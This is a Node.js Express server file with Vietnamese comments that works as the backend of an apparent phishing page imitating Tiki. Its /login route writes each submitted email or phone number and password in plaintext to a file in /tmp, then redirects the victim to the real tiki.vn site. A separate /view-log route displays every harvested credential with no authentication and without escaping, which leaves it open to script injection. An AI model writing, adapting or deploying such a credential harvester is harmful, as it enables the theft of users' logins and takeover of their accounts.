const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = 3000;
const logFilePath = path.join("/tmp", "login_data.txt");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));

// Route POST để nhận thông tin đăng nhập và lưu vào tệp
app.post("/login", (req, res) => {
  const { emailOrPhone, password } = req.body;

  if (!emailOrPhone || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Vui lòng nhập đủ thông tin." });
  }

  const logData = `Email/Số điện thoại: ${emailOrPhone}\nMật khẩu: ${password}\n-----------------------------\n`;

  // Debugging: In ra logData trước khi ghi vào tệp
  console.log("Dữ liệu cần ghi vào tệp:", logData);

  fs.appendFile(logFilePath, logData, (err) => {
    if (err) {
      console.error("Lỗi khi lưu thông tin:", err);
      return res.status(500).json({ success: false, message: "Lỗi server." });
    }
    console.log("Tệp đã được ghi thành công.");
    res.json({
      success: true,
      redirectUrl: "https://tiki.vn/",
    });
  });
});

// Route GET để hiển thị nội dung của tệp login_data.txt
app.get("/view-log", (req, res) => {
  // Đọc nội dung tệp login_data.txt
  fs.readFile(logFilePath, "utf8", (err, data) => {
    if (err) {
      console.error("Lỗi khi đọc tệp:", err);
      return res
        .status(500)
        .json({ success: false, message: "Không thể đọc tệp." });
    }

    if (!data) {
      return res.status(404).send("<h1>Không có dữ liệu đăng nhập nào!</h1>");
    }

    // Trả về dữ liệu tệp trong một trang HTML
    res.send(`
      <html>
        <head>
          <title>Thông tin đăng nhập</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              margin: 20px;
            }
            h1 {
              color: #333;
            }
            pre {
              background-color: #f4f4f4;
              padding: 20px;
              border-radius: 5px;
            }
          </style>
        </head>
        <body>
          <h1>Thông tin đăng nhập đã lưu</h1>
          <pre>${data}</pre>
        </body>
      </html>
    `);
  });
});

// Route mặc định trả về trang login
app.get("/some-path", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Chạy server trên port 3000
app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
